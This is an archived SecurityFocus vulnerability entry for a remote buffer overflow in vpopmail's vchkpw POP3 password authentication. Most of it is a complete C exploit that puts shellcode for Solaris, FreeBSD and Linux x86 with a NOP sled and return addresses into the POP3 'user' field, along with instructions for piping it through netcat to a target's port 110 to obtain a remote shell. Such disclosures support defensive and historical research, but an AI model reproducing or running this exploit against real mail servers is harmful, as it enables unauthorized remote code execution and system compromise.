source: http://www.securityfocus.com/bid/942/info


Vpopmail (vchkpw) is free GPL software package built to help manage virtual domains and non /etc/passwd email accounts on Qmail mail servers. This package is developed by Inter7 (Referenced in the 'Credit' section) and is not shipped, maintained or supported by the main Qmail distribution.

Certain versions of this software are vulnerable to a remote buffer overflow attack in the password authentication of vpopmail. 

/*
   qmail-qpop3d-vchkpw.c (v.3)
   by: K2,
      
   The inter7 supported vchkpw/vpopmail package (replacement for chkeckpasswd)
   has big problems ;)

   gcc -o vpop qmail-pop3d-vchkpw.c [-DBSD|-DSX86]
   ( ./vpop [offset] [alignment] ; cat ) | nc target.com 110   

   play with the alignment to get it to A) crash B) work. 
   qmail-pop3d/vchkpw remote exploit. (Sol/x86,linux/x86,Fbsd/x86) for now.
   Tested agenst: linux-2.2.1[34], FreeBSD 3.[34]-RELEASE
   vpopmail-3.4.10a/vpopmail-3.4.11[b-e]

   Hi plaguez.
   prop's to Interrupt for testing with bsd, _eixon an others ;)
   cheez shell's :)
   THX goes out to STARBUCKS*!($#!
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SIZE   260
#define NOP    0x90
#ifdef SX86
#define DEFOFF 0x8047cfc
#define NOPDEF 75
#elif BSD
#define DEFOFF 0xbfbfdbbf
#define NOPDEF 81
#else
#define DEFOFF 0xbffffcd8
#define NOPDEF 81
#endif 

char *shell = 
#ifdef SX86 // Solaris IA32 shellcode, cheez
"\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
"\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
"\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
"\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
"\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
"\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff"; 
#elif BSD // fBSD shellcode, mudge@l0pht.com                                 
"\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
"\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
"\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
"\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";
#else // Linux shellcode, no idea
"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
"\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
"\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
"\xff\xff/bin/sh\xff";
#endif

int main(int argc, char **argv)
{
   int i=0,esp=0,offset=0,nop=NOPDEF;
   char buffer[SIZE];

   if (argc > 1) offset += strtol(argv[1], NULL, 0);
   if (argc > 2) nop += strtol(argv[2], NULL, 0);

   esp = DEFOFF;
   
   memset(buffer, NOP, SIZE);
   memcpy(buffer+nop, shell, strlen(shell));
   for (i = (nop+strlen(shell)+1); i < SIZE; i += 4) {
      *((int *) &buffer[i]) = esp+offset;
   }
   
   printf("user %s\n",buffer);
   printf("pass ADMR0X&*!(#&*(!\n");

   fprintf(stderr,"\nbuflen = %d, nops = %d, target = 0x%x\n\n",strlen(buffer),nop,esp+offset);
   return(0);
}